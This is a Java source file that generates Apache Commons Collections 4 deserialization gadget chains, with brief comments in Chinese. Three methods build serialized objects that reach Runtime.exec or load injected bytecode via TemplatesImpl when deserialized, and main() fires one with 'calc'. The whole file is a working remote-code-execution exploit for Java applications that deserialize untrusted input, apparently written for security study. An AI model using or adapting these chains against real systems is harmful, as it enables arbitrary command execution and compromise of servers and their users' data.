package com.gulvn;

import com.bytecode.exampleTemplates;
import javassist.ClassPool;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

import static com.bytecode.HelloTemplatesImpl.genByteCode;
import static com.util.Reflections.setFieldValue;
import static org.apache.commons.collections4.map.LazyMap.lazyMap;


public class CommonsCollections4_1 {
    public byte[] getPayload(String cmd) throws Exception{
        //虚假的 为了避免生成payload的时候 弹出两次calc
        Transformer[] fakeTransformers = {new ConstantTransformer(1)};
        //真正触发命令执行的链子
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new String[]{cmd}),
                new ConstantTransformer(1),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = lazyMap(innerMap,chainedTransformer);
        //构建hashmap 完成
        //为了触发TiedMapEntry#hashCode()
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme,"value");
        outerMap.remove("keykey");
        //现在吧transformer放回来
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformer);
        //生成反序列化字符串

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
        return barr.toByteArray();
    }

    public byte[] genPriorityQueue(String cmd) throws  Exception{
//        java.util.PriorityQueue
        //虚假的 为了避免生成payload的时候 弹出两次calc
        Transformer[] fakeTransformers = {new ConstantTransformer(1)};
        //真正触发命令执行的链子
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new String[]{cmd}),
                new ConstantTransformer(1),
        };
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        Comparator comparator = new TransformingComparator(chainedTransformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(chainedTransformer, "iTransformers", transformer);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        return barr.toByteArray();
    }

    public byte[] genTemplate(String cmd) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {ClassPool.getDefault().getCtClass(exampleTemplates.class.getName()).toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
//        我们知道 TemplatesImpl toString(ROME) get方法可以触发
        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(obj);
        queue.add(obj);
        setFieldValue(transformer, "iMethodName", "newTransformer");
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        return barr.toByteArray();
    }
    public static void main(String[] args) throws Exception {
        byte[] payloads = new CommonsCollections4_1().genTemplate("calc");
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payloads));
        ois.readObject();
    }
}
